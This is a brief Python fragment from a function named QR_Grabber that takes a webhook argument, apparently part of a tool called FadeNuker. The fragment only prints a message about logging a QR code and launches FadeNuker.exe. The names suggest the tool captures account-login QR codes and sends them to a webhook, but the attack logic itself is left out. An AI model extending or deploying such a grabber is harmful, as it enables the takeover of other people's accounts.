...
def QR_Grabber(Webhook):
    ...
    print(f'\nOpening a new FadeNuker so you can keep using it while this one logs the qr code!\nFeel free to minimize this window{Fore.RESET}')
    try:
        os.startfile("FadeNuker.exe")
    except:
        print(f"Failed to open FadeNuker, did you rename it or moved it somewhere else?")
        pass
